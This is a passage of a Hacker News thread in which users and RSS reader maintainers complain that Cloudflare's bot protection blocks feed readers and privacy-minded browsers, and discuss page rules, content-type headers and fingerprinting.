create thousands per day. This means that e.g. 90% of your signups are fraudulent, despite the population of fraudsters being extremely small. reply homebrewer 5 hours agorootparentprevIt's equally easy to forget about users from countries with way less freedom of speech and information sharing than in Western rich societies. These anti-abuse measures have made it much more difficult to access information blocked by my internet provider during the last few years. I'm relatively competent and can find ways around it, but my friends and relatives who pursue other career choices simply don't bother anymore. Telegram channels have been a good alternative, but even that is going downhill thanks to French authorities. Cloudflare and Google also often treat us like bots (endless captchas, etc) which makes it even more difficult. reply afh1 6 hours agorootparentprevIP address is a fingerprint to be shared with third parties, of course it's relevant. It's not ulterior motive, it's explicit, it's not caring about your traffic because you're not good product. They can and do differentiate by requiring a sign-in. They just don't care enough to make it actually work. Because they are adtechs and not interested in you as a user. reply anilakar 6 hours agorootparentprevHeck, I cannot even pass ReCAPTCHA nowadays. No amount of clicking buses, bicycles, motorcycles, traffic lights, stairs, crosswalks, bridges and fire hydrants will suffice. The audio transcript feature is the only way to get past a prompt. reply marssaxman 2 hours agorootparentThere's a pho restaurant near where I work which wants you to scan a QR code at the table, then order and pay through their website instead of talking to a person. In three visits, I have not once managed to get past their captcha! (The actual process at this restaurant is to sit down, fuss with your phone a bit, then get up like you're about to leave; someone will arrive promptly to take your order.) reply josteink 5 hours agorootparentprevJust a heads up that this is how Google treat connections it suspects to originate from bots. Silently keeping you in an endless loop promising reward if you can complete it correctly. I discovered this when I set up IPv6 using hurricane electric as a tunnel broker for IPv6 connectivity. Seemingly Google has all HEnet IPv6tunnel subnets listed for such behaviour without it being documented anywhere. It was extremely annoying until I figured out what was going on. reply n4r9 5 hours agorootparent> Silently keeping you in an endless loop promising reward if you can complete it correctly. Sounds suspiciously like how product managers talk to developers as well. reply anilakar 4 hours agorootparentprevSadly my biggest crime is running Firefox with default privacy settings and uBlock Origin installed. No VPNs or IPv6 tunnels, no Tor traffic whatsoever, no Google search history poisoning plugins. If only there was a law that allowed one to be excluded from automatic behavior profiling... reply SoftTalker 2 hours agorootparentprevSame. If a site doesn't want me there, fine. There's no website that's so crucial to my life that I will go through those kinds of contortions to access it. reply orbisvicis 6 hours agorootparentprevI have to solve captchas for Amazon while logged into my Amazon account. reply JohnFen 4 hours agorootparentprev> when I hit a website like this just close the tab and don't bother anymore. Yeah, that's my solution as well. I take those annoyances as the website telling me that they don't want me there, so I grant them their wish. reply immibis 57 minutes agorootparentThat's fine. You were an obstacle to their revenue gathering anyway. reply lioeters 7 hours agorootparentprevSame here. I occasionally encounter websites that won't work with ad blockers, sometimes with Cloudflare involved, and I don't even bother with those sites anymore. Same with sites that display a cookie \"consent\" form without an option to not accept. I reject the entire site. Site owners probably don't even see these bounced visits, and it's such a tiny percentage of visitors who do this that it won't make a difference. Meh, it's just another annoyance to be able to use the web on our own terms. reply capitainenemo 1 hour agorootparentIt's a tiny percentage of visitors, but a tech savvy one, and depending on your website, they could be a higher than average percentage of useful users or product purchasers. The impact could be disproportionate. What's frustrating is many websites don't even realise it is happening because the reporting from the intermediate (Cloudflare say) is inaccurate or incorrectly represents how it works. Fingerprinting has become integral to bot \"protection\". It's also frustrating when people think this can be drop in, and put it in front of APIs that are completely incapable of handling the challenge with no special casing (encountered on FedEx, GoFundMe), much like the RSS reader problem. reply amanda99 4 hours agorootparentprevYes and the most infuriating thing is the \"we need to verify the security of your connection\" text. reply neilv 6 hours agoparentprevSimilar here. It's not unusual to be blocked from a site by CloudFlare when I'm running Firefox (either ESR or current release) on Linux. I suspect that people operating Web sites have no idea how many legitimate users are blocked by CloudFlare. And. based on the responses I got when I contacted two of the companies whose sites were chronically blocked by CloudFlare for months, it seemed like it wasn't worth any employee's time to try to diagnose. Also, I'm frequently blocked by CloudFlare when running Tor Browser. Blocking by Tor exit node IP address (if that's what's happening) is much more understandable than blocking Firefox from a residential IP address, but still makes CloudFlare not a friend of people who want or need to use Tor. reply jorams 4 hours agorootparent> I suspect that people operating Web sites have no idea how many legitimate users are blocked by CloudFlare. I sometimes wonder if all Cloudflare employees are on some kind of whitelist that makes them not realize the ridiculous false positive rate of their bot detection. reply johnklos 31 minutes agorootparentprevI've had several discussions that were literally along the lines of, \"we don't see what you're talking about in our logs\". Yes, you don't - traffic is blocked before it gets to your servers! reply pjc50 6 hours agorootparentprev> CloudFlare not a friend of people who want or need to use Tor The adversarial aspect of all this is a problem: P(malicious|Tor) is much higher than P(malicious|!Tor) reply lovethevoid 2 hours agorootparentprevWhat are some examples? I've been running ff on linux for quite some time now and am rarely blocked. I just run it with ublock origin. reply capitainenemo 1 hour agorootparentOdds are they have Resist Fingerprinting turned on. When I use it in a Firefox profile I encounter this all over the place. Drupal, FedEx.. some sites handle it better than others. Some it's a hard block with a single terse error. Some it is a challenge which gets blocked due to using remote javascript. Some it's a local challenge you can get past. But it has definitely been getting worse. Fingerprinting is being normalised, and the excuse of \"bot protection\" (bots can make unique fingerprints too, though) means that it can now be used maliciously (or by ad networks like google, same diff) as a standard feature. reply amatecha 3 hours agorootparentprevYeah, I've contacted numerous owners of personal/small sites and they are usually surprised, and never have any idea why I was blocked (not sure if it's an aspect of CF not revealing the reason, or the owner not knowing how to find that information). One or two allowlisted my IP but that doesn't strike me as a solution. I've contacted companies about this and they usually just tell me to use a different browser or computer, which is like \"duh, really?\" , but also doesn't solve the problem for me or anyone else. reply BiteCode_dev 11 hours agoparentprevCloudflare is a fantastic service with an unmatched value proposition, but it's unfortunately slowly killing web privacy, with 1000s paper cuts. Another problem is \"resist fingerprinting\" prevents some canvas processing, and many websites like bluesky, linked in or substack uses canvas to handle image upload, so your images appear to be stripes of pixel. Then you have mobile apps that just don't run if you don't have a google account, like chatgpt's native app. I understand why people give up, trying to fight for your privacy is an uphill battle with no end in sight. reply madeofpalk 9 hours agorootparent> Then you have mobile apps that just don't run if you don't have a google account, like chatgpt's native app. Is that true? At least on iOS you can log into the ChatGPT with same email/password as the website. I never use Google login for stuff and ChatGPT works fine for me. reply BiteCode_dev 9 hours agorootparentSee other comment. reply pjc50 6 hours agorootparentprevThe privacy battle has to be at the legal layer. GDPR is far from perfect (bureaucratic and unclear with weak enforcement), but it's a step in the right direction. In an adversarial environment, especially with both AI scrapers and AI posters, websites have to be able to identify and ban persistent abusers. Which unfortunately implies having some kind of identification of everybody. reply wbl 3 hours agorootparentYou notice that Analogue Devices puts their (incredibly useful) information up for free. That's because they make money other ways. Ad supported content farm Internet had a nice run but we will get on without it. reply Gormo 1 hour agorootparentprev> The privacy battle has to be at the legal layer. I couldn't disagree more. The way to protect privacy is to make privacy the standard at the implementation layer, and to make it costly and difficult to breach it. Trying to rely on political institutions without the practical and technical incentives favoring privacy will inevitably result in the political institutions themselves becoming the main instrument that erodes privacy. reply BiteCode_dev 5 hours agorootparentprevThat's another problem, we want cheap easy solutions like tracking people, instead of more targetteed or systemic ones. reply nonameiguess 4 hours agorootparentprevNo, it's more than that. Cloudflare's bot protection has blocked me from sites where I have a paid account, paid for by my real checking account with my real name attached. Even when I am perfectly willing to give out my identity and be tracked, I still can't because I can't even get to the login page. reply KomoD 9 hours agorootparentprev> Then you have mobile apps that just don't run if you don't have a google account, like chatgpt's native app. That's not true, I use ChatGPT's app on my phone without logging into a Google account. You don't even need any kind of account at all to use it. reply BiteCode_dev 9 hours agorootparentOn Android at least, even if you don't need to log in to your google account when connecting to chatgpt, the app won't work if your phone isn't signed in into google play, which doesn't work if your phone isn't linked to a google account. An android phone asks you to link a google account when you use it for the first time. It takes a very dedicated user to refuse that, then to avoid logging in into the gmail, youtube or app store apps which will all also link your phone to your google account when you sign in. But I do actively avoid this, I use Aurora, F-droid, K9 and NewPipeX, so no link to google. But then no ChatGPT app. When I start it, I get hit with a logging page to the app store and it's game over. reply __MatrixMan__ 5 hours agorootparentI have a similar experience with the pager duty app. It loads up and then exits with \"security problem detected by app\" because I've made it more secure by isolating it from Google (a competitor). Workaround is to just control it via slack instead. reply BiteCode_dev 5 hours agorootparentWell you can use the web base chagpt so there is a workaround. Except it's worse a worse experience. reply acdha 6 hours agorootparentprevSo the requirement is to pass the phone’s system validation process rather than having a Google account. I don’t love that but I can understand why they don’t want to pay the bill for the otherwise ubiquitous bots, and it’s why it’s an Android-specific issue. reply BiteCode_dev 5 hours agorootparentYou can make a very rational case for each privacy invasive technical decision ever made. In the end, the fact remain: no chatgpt app without giving up your privacy, to google none the less. reply acdha 4 hours agorootparent“Giving up your privacy” is a pretty sweeping claim – it sounds like you’re saying that Android inherently leaks private data to Google, which is broader than even Apple fans tend to say. reply michaelt 2 hours agorootparentA person who was maximally distrustful of Google would assume they link your phone and your IP through the connection used to receive push notifications, and the wifi-network-visibility-to-location API, and the software update checker, and the DNS over HTTPS, and suchlike. As a US company, they could even be forced to do this in secret against their will, and lie about it. Of course as Google doesn't claim they do this, many people would consider it unreasonably fearful/cynical. reply acdha 43 minutes agorootparentSure, but that says you shouldn’t have a phone, not that ChatGPT is forcing you to give up your privacy. reply BiteCode_dev 2 hours agorootparentprevGoogle and Apple were both part of the PRISM program, of course I'm making this claim. That's the opposite stance that would be bonkers. reply acdha 37 minutes agorootparentPRISM covered communications through U.S. company’s servers. It was not a magic back door giving them access to your device’s local data, and even if you did believe that it was the answer would be not using a phone. A major intelligence agency does not need you to have a Google account so they can spy on you. reply ForHackernews 6 hours agorootparentprevYou might like: https://e.foundation/e-os/ reply BiteCode_dev 5 hours agorootparentThat won't make chatgpt's app work thought. reply ForHackernews 4 hours agorootparentIt might well do, depending on what ChatGPT's app is asking the OS for. /e/OS is an Android fork that removes Google services and replaces them with open source stubs/re-implementations from https://microg.org/ I haven't tried the ChatGPT app, but I know that, for example my bank and other financial services apps work with on-device fingerprint authentication and no Google account on /e/OS. reply mzajc 7 hours agoparentprevI randomize my User-Agent header and many websites outright block me, most often with no captcha and no useless error message. The most egregious is Microsoft (just about every Microsoft service/page, really), where all you get is a \"The request is blocked.\" and a few pointless identifiers listed at the bottom, purely because it thinks your browser is too old. CF's captcha page isn't any better either, usually putting me in an endless loop if it doesn't like my User-Agent. reply pushcx 6 hours agorootparentRails is going to make this much worse for you. All new apps include naive agent sniffing and block anything “old” https://github.com/rails/rails/pull/50505 reply mzajc 5 hours agorootparentThis is horrifying. What happened to simply displaying a \"Your browser is outdated, consider upgrading\" banner on the website? reply whoopdedo 3 hours agorootparentThe irony being you can get around the block by pretending to be a bot. https://github.com/rails/rails/pull/52531 reply shbooms 4 hours agorootparentprevidk, even that seems too much to me, but maybe I'm just being too senstive. but like, why is it a website's job to tell me what browser version to use? unless my outdated browser is lacking legitmate functionality which is required by your website, just serve the page and be done with it. reply michaelt 2 hours agorootparentBack when the sun was setting on IE6, sites deployed banners that basically meant \"We don't test on this, there's a good chance it's broken, but we don't know the specifics because we don't test with it\" reply freedomben 4 hours agorootparentprevWow. And this is now happening right as I've blacklisted google-chrome due to manifest v3 removal :facepalm: reply GoblinSlayer 6 hours agorootparentprevdef blocked? user_agent_version_reported? && unsupported_browser? end well, you know what to do here :) reply charrondev 7 hours agorootparentprevAre you sending an actual random string as your UA or sending one of a set of actual user agents? You’re best off just picking real ones. We’ve got hit by a botnet sending 10k+ requests from 40 different ASNs with 1000s of different IPs. The only way we’re able to identify/block the traffic was excluding user agents matching some regex (for whatever reason they weren’t spoofing real user agents but weren’t sending actual ones either). reply RALaBarge 7 hours agorootparentI worked at an anti-spam email security company in the aughts, and we had a perl engine that would rip apart the MIME boundaries and measure everything - UA, SMTP client fingerprint headers, even the number of anchor or paragraph tags. A large combination of IF/OR evaluations with a regex engine did a pretty good job since the botnets usually don't bother to fully randomize or really opsec the payloads they are sending since it is a cannon instead of a flyswatter. reply kccqzy 5 hours agorootparentSimilar techniques are known in the HTTP world too. There were things like detecting the order of HTTP request headers and matching them to known software, or even just comparing the actual content of the Accept header. reply miki123211 56 minutes agorootparentAnd then there's also TLS fingerprinting. Different browsers use TLS in slightly different ways, send data in a slightly different order, have a different set of supported extensions / algorithms etc. If your user agent says Safari 18, but your TLS fingerprint looks like Curl and not Safari, sophisticated services will immediately detect that something isn't right. reply mzajc 5 hours agorootparentprevI use the Random User-Agent Switcher[1] extension on Firefox. It does pick real agents, but some of them might show a really outdated browser (eg. Firefox 5X), which I assume is the reason I'm getting blocked. [1]: https://addons.mozilla.org/en-US/firefox/addon/random_user_a... reply lovethevoid 2 hours agorootparentprevNot sure a random UA extension is giving you much privacy. Try your results on coveryourtracks eff, and see. A random UA would provide a lot of identifying information despite being randomized. From experience, a lot of the things people do in hopes of protecting their privacy only makes them far easier to profile. reply mzajc 2 hours agorootparentcoveryourtracks.eff.org is a great service, but it has a few limitations that apply here: - The website judges your fingerprint based on how unique it is, but assumes that it's otherwise persistent. Randomizing my User-Agent serves the exact opposite - a given User-Agent might be more unique than using the default, but I randomize it to throw trackers off. - To my knowledge, its \"One in x browsers\" metric (and by extension the \"Bits of identifying information\" and the final result) are based off of visitor statistics, which would likely be skewed as most of its visitors are privacy-conscious. They only say they have a \"database of many other Internet users' configurations,\" so I can't verify this. - Most of the measurements it makes rely on javascript support. For what it's worth, it claims my fingerprint is not unique when javascript is disabled, which is how I browse the web by default. The other extreme would be fixing my User-Agent to the most common value, but I don't think that'd offer me much privacy unless I also used a proxy/NAT shared by many users. reply DrillShopper 2 hours agoparentprevMaybe after the courts break up Amazon the FTC can turn its eye to Cloudflare. reply gjsman-1000 2 hours agorootparentA. Do you think courts give a darn about the 0.1% of users that are still using RSS? We might as well care about the 0.1% of users who want the ability to set every website's background color to purple with neon green anchor tags. RSS never caught on as a standard to begin with, peaking at 6% adoption by 2005. B. Cloudflare has healthy competition with AWS, Akamai, Fastly, Bunny.net, Mux, Google Cloud, Azure, you name it, there's a competitor. This isn't even an Apple vs Google situation. reply Jazgot 10 hours agoparentprevMy rss reader was blocked on kvraudio.com by cloudflare. This issue wasn't solved for months. I simply stopped reading anything on kvraudio. Thank you cloudflare! reply pessimizer 5 hours agoparentprevAlso, Cloudflare won't let you in if you forge your referer (it's nobody's business what site I'm coming from.) For years, you could just send the root of the site you were visiting, then last year somebody at Cloudflare flipped a switch and took a bite out of everyone's privacy. Now it's just endless reloading captchas. reply zamadatix 5 hours agorootparentWhy go through that hassle instead of just removing the referer? reply bityard 2 hours agorootparentLots of sites see an empty referrer and send you to their main page or marketing page. Which means you can't get anywhere else on their site without a valid referrer. They consider it a form of \"hotlink\" protection. (I'm not saying I agree with it, just that it exists.) reply philsnow 1 hour agorootparentprevAh, maybe this is what’s happening to me.. I use Firefox with uBlock origin, privacy badger, multi-account containers, and temporary containers. Whenever I click a link to another site, i get a new tab in either a pre-assigned container or else in a “tmpNNNN” container, and i think either by default or I have it configured to omit Referer headers on those new tab navigations. reply anthk 5 hours agoparentprevOr any Dillo user, with a PSP User Agent which is legit for small displays. reply anal_reactor 7 hours agoparentprevOn my phone Opera Mobile won't be allowed into some websites behind CloudFlare, most importantly 4chan reply dialup_sounds 5 hours agorootparent4chan's CF config is so janky at this point it's the only site I have to use a VPN for. reply viraptor 10 hours agoparentprevI know it's not a solution for you specifically here, but if anyone has access to the CF enterprise plan, they can report specific traffic as non-bot and hopefully improve the situation. They need to have access to the \"Bot Management\" feature though. It's a shitty situation, but some of us here can push back a little bit - so do it if you can. And yes, it's sad that the \"make internet work again\" is behind an expensive paywall.. reply meeby 8 hours agorootparentThe issue here is that RSS readers are bots. Obviously perfectly sensible and useful bots, but they’re not “real people using a browser”. I doubt you could get RSS readers listed on Cloudflare’s “good bots” list either which would allow them the default bot protection feature given they’ll all run off random residential IPs. reply viraptor 37 minutes agorootparentI was responding to a person with Firefox issues, not RSS. I'm not sure either if RSS bots could be added to good bots, but if anyone has traffic from them, we can definitely try. (No high hopes though, given the responses I got from support so far) reply j16sdiz 7 hours agorootparentprevThey can't whitelist useragent, otherwise bot will pass just using agent spoofing. If you have enterprise plan, you can have custom rules including allowing by url reply sam345 6 hours agorootparentprevNot sure if I get this.It seems to me an RSS reader is as much of a bot as a browser is for HTML. It just reads RSS rather than HTML. reply kccqzy 5 hours agorootparentThe difference is that RSS readers usually do background fetches on their own rather than waiting for a human to navigate to a page. So in theory, you could just set up a crontab (or systemd timer) that simply xdg-open various pages on a schedule and not be treated as bots. reply jasonlotito 4 hours agoparentprevCloudflare has always been a dumpster fire in usability. The number of times it would block me in that way was enough to make me seriously question anyones technical knowledge that used it. It's a dumpster fire. Friends don't let friend use Cloudflare. To me, it's like the Spirit airlines of CDNs. Sure, tech wise it might work great, but from your users perspective: it's trash. reply immibis 52 minutes agorootparentIt's got the best vendor lock-in enshittification story - it's free - and that's all that matters. reply kevincox 18 hours agoprevI dislike advice of whitelisting specific readers by user-agent. Not only is this endless manual work that will only solve the problem for a subset of users but it also is easy to bypass by malicious actors. My recommendation would be to create a page rule that disables bot blocking for your feeds. This will fix the problem for all readers with no ongoing maintenance. If you are worried about DoS attacks that may hammer on your feeds then you can use the same configuration rule to ignore the query string for cache keys (if your feed doesn't use query strings) and overriding the caching settings if your server doesn't set the proper headers. This way Cloudflare will cache your feed and you can serve any number of visitors without putting load onto your origin. As for Cloudflare fixing the defaults, it seems unlikely to happen. It has been broken for years, Cloudflare's own blog is affected. They have been \"actively working\" on fixing it for at least 2 years according to their VP of product: https://news.ycombinator.com/item?id=33675847 reply benregenspan 6 hours agoparentAI crawlers have changed the picture significantly and in my opinion are a much bigger threat to the open web than Cloudflare. The training arms race has drastically increased bot traffic, and the value proposition behind that bot traffic has inverted. Previously many site operators could rely on the average automated request being net-beneficial to the site and its users (outside of scattered, time-limited DDoS attacks) but now most of these requests represent value extraction. Combine this with a seemingly related increase in high-volume bots that don't respect robots.txt and don't set a useful User-Agent, and using a heavy-handed firewall becomes a much easier business decision, even if it may target some desirable traffic (like valid RSS requests). reply vaylian 11 hours agoparentprevI don't know if cloudflare offers it, but whitelisting the URL of the RSS feed would be much more effective than filtering user agents. reply jks 4 hours agorootparentYes, you can do it with a \"page rule\", which the parent comment mentioned. The CloudFlare free tier has a budget of three page rules, which might mean that you have to bundle all your rss feeds in one folder so they share a path prefix. reply derkades 11 hours agorootparentprevYes it supports it, and I think that's what the parent comment was all about reply BiteCode_dev 11 hours agorootparentSpecifically, whitelisting the URL for the bot protection, but not the cache, so that you are still somewhat protected against adversarial use. reply londons_explore 7 hours agorootparentAn adversary can easily send no-cache headers to bust the cache. reply acdha 6 hours agorootparentThe CDN can choose whether to honor those. That hasn’t been an effective adversarial technique since the turn of the century. reply londons_explore 4 hours agorootparentdoes cloudflare give such an option? Even for non-paid accounts? reply a-french-anon 8 hours agoparentprevAnd for those of us using sfeed, the default UA is Curl's. reply jgrahamc 11 hours agoprevMy email is jgc@cloudflare.com. I'd like to hear from the owners of RSS readers directly on what they are experiencing. Going to ask team to take a closer look. reply kalib_tweli 9 hours agoparentThere are email obfuscation and managed challenge script tags being injected into the RSS feed. You simply shouldn't have any challenges whatsoever on an RSS feed. They're literally meant to be read by a machine. reply kalib_tweli 8 hours agorootparentI confirmed that if you explicitly set the Content-Type response header to application/rss+xml it seems to work with Cloudflare Proxy enabled. The issue here is that Cloudflare's content type check is naive. And the fact that CF is checking the content-type header directly needs to be made more explicit OR they need to do a file type check. reply londons_explore 7 hours agorootparentI wonder if popular software for generating RSS feeds might not be setting the correct content-type header? Maybe this whole issue could be mostly-fixed by a few github PR's... reply onli 6 hours agorootparentCorrect might be debatable here as well. My blog for example sets Content-Type to text/xml, which is not exactly wrong for an RSS feed (after all, it is text and XML) and IIRC was the default back then. There were compatibility issues with other type headers, at least in the past. reply johneth 4 hours agorootparentI think the current correct content types are: 'application/rss+xml' (for RSS) 'application/atom+xml' (for Atom) reply londons_explore 4 hours agorootparentSounds like a kind samaritan could write a scanner to find as many RSS feeds as possible which look like RSS/Atom and don't have these content types, then go and patch the hosting software those feeds use to have the correct content types, or ask the webmasters to fix it if they're home-made sites. As soon as a majority of sites use the correct types, clients can start requiring it for newly added feeds, which in turn will make webmasters make it right if they want their feed to work. reply kalib_tweli 6 hours agorootparentprevIt wouldn't. It's the role of the HTTP server to set the correct content type header. reply djbusby 6 hours agorootparentprevThe number of feeds with crap headers and other non-spec stuff going on; and loads of clients missing useful headers. Ugh. It seems like it should be simple; maybe that's why there are loads of naive implementations. reply badlibrarian 5 hours agoparentprevThank you for showing up here and being open to feedback. But I have to ask: shouldn't Cloudflare be running and reviewing reports to catch this before it became such a problem? It's three clicks in Tableau for anyone who cares, and clearly nobody does. And this isn't the first time something like this has slipped through the cracks. I tried reaching out to Cloudflare with issues like this in the past. The response is dozens of employees hitting my LinkedIn page yet no responses to basic, reproduceable technical issues. You need to fix this internally as it's a reputational problem now. Less screwing around using Salesforce as your private Twitter, more leadership in triage. Your devs obviously aren't motivated to fix this stuff independently and for whatever reason they keep breaking the web. reply 015a 4 hours agorootparentThe reality that HackerNews denizens need to accept, in this case and in a more general form, is: RSS feeds are not popular. They aren't just unpopular in the way that, say, Peacock is unpopular relative to Netflix; they're truly unpopular, used regularly by a number of people that could fit in an american football stadium. There are younger software engineers at Cloudflare that have never heard the term \"RSS\" before, and have no notion of what it is. It will probably be dead technology in ten years. I'm not saying this to say its a good thing; it isn't. Here's something to consider though: Why are we going after Cloudflare for this? Isn't the website operator far, far more at-fault? They chose Cloudflare. They configure Cloudflare. They, in theory, publish an RSS feed, which is broken because of infrastructure decisions they made. You're going after Ryobi because you've got a leaky pipe. But beyond that: isn't this tool Cloudflare publishes doing exactly what the website operators intended it to do? It blocks non-human traffic. RSS clients are non-human traffic. Maybe the reason you don't want to go after the website operators is because you know you're in the wrong? Why can't these RSS clients detect when they encounter this situation, and prompt the user with a captive portal to get past it? reply badlibrarian 4 hours agorootparentI'm old enough to remember Dave Winer taking Feedburner to task for inserting crap into RSS feeds that broke his code. There will always be niche technologies and nascent standards and we're taking Cloudflare to task today because if they continue to stomp on them, we get nowhere. \"Don't use Cloudflare\" is an option, but we can demand both. reply 015a 1 hour agorootparentI'm not backing down on this one: This is straight up an \"old man yelling at the kids to get off his lawn\" situation, and the fact that JGC from Cloudflare is in here saying \"we'll take a look at this\" is so far and beyond what anyone reasonable would expect of them that they deserve praise and nothing else. This is a matter between You and the Website Operators, period. Cloudflare has nothing to do with this. This article puts \"Cloudflare\" in the title because its fun to hate on Cloudflare and it gets upvotes. Cloudflare is a tool. These website operators are using Cloudflare The Tool to block inhuman access to their websites. RSS CLIENTS ARE NOT HUMAN. Let me repeat that: Cloudflare's bot detection is working fully appropriately here, because RSS Clients are Bots. Everything here is working as expected. The part where change should be asked is: Website operators should allow inhuman actors past the Cloudflare bot detection firewall specifically for RSS feeds. They can FULLY DO THIS. Cloudflare has many, many knobs and buttons that Website Operators can tweak; one of those is e.g. a page rule to turn off bot detection for specific routes, such as `/feed.xml`. If your favorite website is not doing this, its NOT CLOUDFLARE'S FAULT. Take it up with the Website Operators, Not Cloudflare. Or, build an RSS Client which supports a captive portal to do human authorization. God this is so boring, y'all just love shaking your first and yelling at big tech for LITERALLY no reason. I suspect its actually because half of y'all are concerningly uneducated on what we're talking about. reply badlibrarian 43 minutes agorootparentAs part of proxying what may be as much as 20% of the web, Cloudflare injects code and modifies content that passes between clients and servers. It is in their core business interests to receive and act upon feedback regarding this functionality. reply gjsman-1000 2 hours agorootparentprev\"Old man yells at cloud about how the young'ns don't appreciate RSS.\" I mean that somewhat sarcastically; but there does come a point where the demands are unreasonable, the technology is dead. There are probably more people browsing with JavaScript disabled than using RSS feeds. There are probably more people browsing on Windows XP than using RSS feeds. Do I yell at you because your personal blog doesn't support IE6 anymore? reply badlibrarian 53 minutes agorootparentSpotify and Apple Podcasts use RSS feeds to update what they show in their apps. And even if millions of people weren't dependent on it, suggesting that an infrastructure provider not fix a bug only makes the web worse. reply viraptor 10 hours agoparentprevIt's cool and all that you're making an exception here, but how about including a \"no, really, I'm actually a human\" link on the block page rather than giving the visitor a puzzle: how to report the issue to the page owner (hard on its own for normies) if you can't even load the page. This is just externalising issues that belong to the Cloudflare service. reply jgrahamc 10 hours agorootparentI am not trying to \"make an exception\", I'm asking for information external to Cloudflare so I can look at what people are experiencing and compare with what our systems are doing and figure out what needs to improve. reply PaulRobinson 9 hours agorootparentSome \"bots\" are legitimate. RSS is intended for machine consumption. You should not be blocking content intended for machine consumption because a machine is attempting to consume it. You should not expect a machine, consuming content intended for a machine, to do some sort of step to show they aren't a machine, because they are in fact a machine. There is a lot of content on the internet that is not used by humans, and so checking that humans are using it is an aggressive anti-pattern that ruins experiences for millions of people. It's not that hard. If the content being requested is RSS (or Atom, or some other syndication format intended for consumption by software), just don't do bot checks, use other mechanisms like rate limiting if you must stop abuse. As an example: would you put a captcha on robots.txt as well? As other stories here can attest to, Cloudflare is slowly killing off independent publishing on the web through poor product management decisions and technology implementations, and the fix seems pretty simple. reply jamespo 6 hours agorootparentFrom another post, if the content-type is correct it gets through. If this is the case I don't see the problem. reply robertlagrant 9 hours agorootparentprevThis is useful info: https://news.ycombinator.com/item?id=33675847 reply methou 10 hours agorootparentprevSome clients are more like a bot/service, imagine google reader that fetches and caches content for you. The client I’m currently using is miniflux, it also works in this way. I understand that there are some more interactive rss readers, but from personal experience it’s more like “hey I’m a good bot, let me in” reply _Algernon_ 9 hours agorootparentAn rss reader is a user agent (ie. a software acting on behalf of its users). If you define rss readers as a bot (even if it is a good bot), you may as well call Firefox a bot (it also sends off web requests without explicit approval of each request by the browser). reply sofixa 9 hours agorootparentTheir point was that the RSS reader does the scraping on its own in the background, without user input. If it can't read the page, it can't; it's not initiated by the user where the user can click on a \"I'm not a bot, I promise\" button. reply viraptor 9 hours agorootparentprevIt was a mental skip, but the same idea. It would awesome if CF just allowed reporting issues at the point something gets blocked - regardless if it's a human or a bot. They're missing an \"I'm misclassified\" button for people actually affected without the third-party runaround. reply fluidcruft 5 hours agorootparentUnfortunately, I would expect that queue of reports to get flooded by bad faith actors. reply viraptor 41 minutes agorootparentSure, but now they say that queue should go to the website owner instead, who has less global visibility on the traffic. So that's just ignoring something they don't want to deal with. reply is_true 6 hours agoparentprevMaybe when you detect urls that return the rss mimetype notify the owner of the site/CF account that it might be a good idea to allow bots on that urls. Ideally you could make it a simple switch in the config, somethin like: \"Allow automated access on RSS endpoints\". reply prmoustache 8 hours agoparentprevIt is not only rss reader users that are affected. Any user with some extension to block trackers get regularly forbidden access to websites or have to deal with tons of captcha. reply kevincox 6 hours agoparentprevI'll mail you as well but I think public discussion is helpful. Especially since I have seem similar responses to this over the years and it feels very disingenuous. The problem is very clear (Cloudflare serves 403 blocks to feed readers for no reason) you have all of the logs. The solution is maybe not trivial but I fail to see how the perspective of someone seeing a 403 block is going to help much. This just starts to sound like a way to seem responsive without actually doing anything. From the feed reader perspective it is a 403 response. For example my reader has been trying to read https://blog.cloudflare.com/rss/ and the last successful response it got was on 2021-11-17. It has been backing off due to \"errors\" but it still is checking every 1-2 weeks and gets a 403 every time. This obviously isn't limited to the Cloudflare blog, I see it on many site \"protected by\" (or in this case broken by) Cloudflare. I could tell you what public cloud IPs my reader comes from or which user-agent it uses but that is besides the point. This is a URL which is clearly intended for bots so it shouldn't be bot-blocked by default. When people reach out to customer support we tell them that this is a bug for the site and there isn't much we can do. They can try contacting the site owner but this is most likely the default configuration of Cloudflare causing problems that the owner isn't aware of. I often recommend using a service like FeedBurner to proxy the request as these services seem to be on the whitelist of Cloudflare and other scraping prevention firewalls. I think the main solution would be to detect intended-for-robots content and exclude it from scraping prevention by default (at least to a huge degree). Another useful mechanism would be to allow these to be accessed when the target page is cachable, as the cache will protect the origin from overload-type DoS attacks anyways. Some care needs to be taken to ensure that adding a ?bust={random} query parameter can't break through to the origin but this would be a powerful tool for endpoints that need protection from overload but not against scraping (like RSS feeds). Unfortunately cache headers for feeds are far from universal, so this wouldn't fix all feeds on its own. (For example the Cloudflare blog's feed doesn't set any caching headers and is labeled as `cf-cache-status: DYNAMIC`.) reply erikrothoff 12 hours agoprevAs the owner of an RSS reader I love that they are making this more public. 30% of our support requests are ”my feed doesn’t” work. It sucks that the only thing we can say is ”contact the site owner, it’s their firewall”. And to be fair it’s not only Cloudflare, so many different firewall setups cause issues. It’s ironic that a public API endpoint meant for bots is blocked for being a bot. reply elwebmaster 3 hours agoprevUsing Cloudflare on your website could be blocking Safari users, Chrome users, or just any users. It’s totally broken. They have no way of measuring the false positives. Website owners are paying for it in lost revenue. And poor users who lose access for no fault of their own. Until some C-level exec at a BigTech randomly gets blocked and makes noise. But even then, Cloudflare will probably just whitelist that specific domain/IP. It is very interesting how I have never been blocked when trying to access Cloudflare itself, only blocked on their customer’s sites. reply butz 4 hours agoprevNot \"could\" but it is actually blocking. Very annoying when government website does that, as usually it is next to impossible to explain the issue and ask for a fix. And even if the fix is made, it is reverted several weeks later. Other websites does that too, it was funny when one website was asking RSS reader to resolve captcha and prove they are human. reply belkinpower 12 hours agoprevI maintain an RSS reader for work and Cloudflare is the bane of my existence. Tons of feeds will stop working at random and there’s nothing we can do about it except for individually contacting website owners and asking them to add an exception for their feed URL. reply stanislavb 12 hours agoparentI was recently contacted by one of my website users as their RSS reader was blocked by Cloudflare. reply sammy2255 12 hours agoparentprevUnfortunately its not really Cloudflare but webadmins who have configured it to block everything thats not a browser, whether unknowingly or not reply afandian 12 hours agorootparentIf Cloudflare offer a product, for a particular purpose, that breaks existing conventions of that purpose, then it’s Cloudflare. reply echoangle 11 hours agorootparentWell it doesn’t break the conventions of the purpose they offer it for. Cloudflare attempts to block non-human users, and this is supposed to be used for human-readable websites. If someone puts cloudflare in front of a RSS feed, that’s user error. It’s like someone putting a captcha in front of an API and then complaining that the Captcha provider is breaking conventions. reply sammy2255 11 hours agorootparentprevNot really. You wouldn’t complain to a fence company for blocking a path if there were hired to do exactly that reply shakna 11 hours agorootparentYes, I would. Experts are expected to relay back to their client with their thoughts on 